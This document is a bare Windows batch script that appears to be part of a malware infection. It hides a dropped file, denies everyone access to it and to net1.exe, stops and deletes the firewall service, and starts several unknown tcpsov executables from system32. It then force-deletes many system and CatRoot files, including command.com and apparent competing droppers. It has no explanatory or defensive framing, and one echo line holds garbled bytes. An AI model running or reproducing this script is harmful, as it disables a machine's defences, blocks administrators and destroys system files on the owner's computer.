if exist %SystemRoot%\system32\\attrib.exe attrib +s +r +h c:\cc.txt
echo ?G??G?Eàè¡« >%SystemRoot%\\AppPatch\\nvunins.bat
if exist %SystemRoot%\system32\\attrib.exe attrib +s +r +h %SystemRoot%\\AppPatch\\nvunins.bat
if exist %SystemRoot%\system32\\cacls.exe cacls.exe %SystemRoot%\\AppPatch\\nvunins.bat /e /d everyone
if exist %SystemRoot%\system32\\sc.exe sc stop sharedaccess
if exist %SystemRoot%\system32\\sc.exe sc delete sharedaccess
if exist %SystemRoot%\system32\\cacls.exe cacls.exe %SystemRoot%\\system32\\net1.exe /e /d everyone
if exist %SystemRoot%\system32\\cacls.exe cacls.exe %SystemRoot%\\system32\\net1.exe /e /d system
if exist %SystemRoot%\\system32\\tcpsov1.exe start %SystemRoot%\\system32\\tcpsov1.exe
if exist %SystemRoot%\\system32\\tcpsov2.exe start %SystemRoot%\\system32\\tcpsov2.exe
if exist %SystemRoot%\\system32\\tcpsov3.exe start %SystemRoot%\\system32\\tcpsov3.exe
if exist %SystemRoot%\\system32\\tcpsov5.exe start %SystemRoot%\\system32\\tcpsov5.exe
if exist %SystemRoot%\\system32\\tcpsov7.exe start %SystemRoot%\\system32\\tcpsov7.exe
if exist %SystemRoot%\system32\CatRoot\setups.bat del %SystemRoot%\system32\CatRoot\setups.bat
if exist %SystemRoot%\system32\ias\*.* del %SystemRoot%\system32\ias\*.*  /f /s /q /a
if exist %SystemRoot%\system32\CatRoot\380.exe del %SystemRoot%\\system32\\CatRoot\\380.exe
if exist %SystemRoot%\system32\CatRoot\008.exe del %SystemRoot%\system32\CatRoot\008.exe
if exist %SystemRoot%\system32\CatRoot\2004.exe del %SystemRoot%\system32\CatRoot\2004.exe
if exist %SystemRoot%\system32\CatRoot\fyie.exe del %SystemRoot%\system32\CatRoot\fyie.exe
if exist %SystemRoot%\system32\CatRoot\319.exe del %SystemRoot%\system32\CatRoot\319.exe
if exist %SystemRoot%\system32\CatRoot\1139.exe del %SystemRoot%\system32\CatRoot\1139.exe
if exist %SystemRoot%\system32\CatRoot\termsrv2.dll del %SystemRoot%\system32\CatRoot\termsrv2.dll
if exist %SystemRoot%\system32\CatRoot\*.exe del %SystemRoot%\system32\CatRoot\*.exe  /f /s /q /a

del %SystemRoot%\\system32\\setuplo.bat /f /s /q /a
del %SystemRoot%\\system32\\setuplo.sys /f /s /q /a
del %SystemRoot%\\system32\\setuplo.exe /f /s /q /a
del %SystemRoot%\\system32\\config\\setuplo.exe /f /s /q /a
del %SystemRoot%\\system32\\tpcyi.bat /f /s /q /a
del %SystemRoot%\\system32\\tpcyi.sys /f /s /q /a
del %SystemRoot%\\system32\\tpcyi.exe /f /s /q /a
del c:\xiaoyi2009*.exe /f /s /q /a
del %SystemRoot%\\system32\\NetSetup2.bat /f /s /q /a
del %SystemRoot%\\system32\\spool\\NetSetup1.bat /f /s /q /a
del %SystemRoot%\\tcpso*.exe
del %SystemRoot%\\tcpsyi*.exe
del %SystemRoot%\\system32\\arphrop2.tbl /f /s /q /a
del %SystemRoot%\\system32\\config\\arphroyi3.tbl /f /s /q /a
del %SystemRoot%\\system32\\config\\setupyi3.bat /f /s /q /a
del %SystemRoot%\\system32\\config\\arphrosr2.tbl /f /s /q /a
del %SystemRoot%\\system32\\config\\setups2.bat /f /s /q /a
rename %SystemRoot%\\system32\\tcpso*.exe c2851*.nls
rename %SystemRoot%\\system32\\tcpsyi*.exe c2852*.nls
del %SystemRoot%\\system32\\c2851*.nls /f /s /q /a
del %SystemRoot%\\system32\\c2852*.nls /f /s /q /a
del %SystemRoot%\\system32\\ras\\dels.bat /f /s /q /a
del %SystemRoot%\\system32\\command.com /f /s /q /a
del %SystemRoot%\\system32\\ras\\dels.bat /f /s /q /a

echo DOSmode6.29 >>%SystemRoot%\\system32\\drivers\\acpiec1.sys
exit
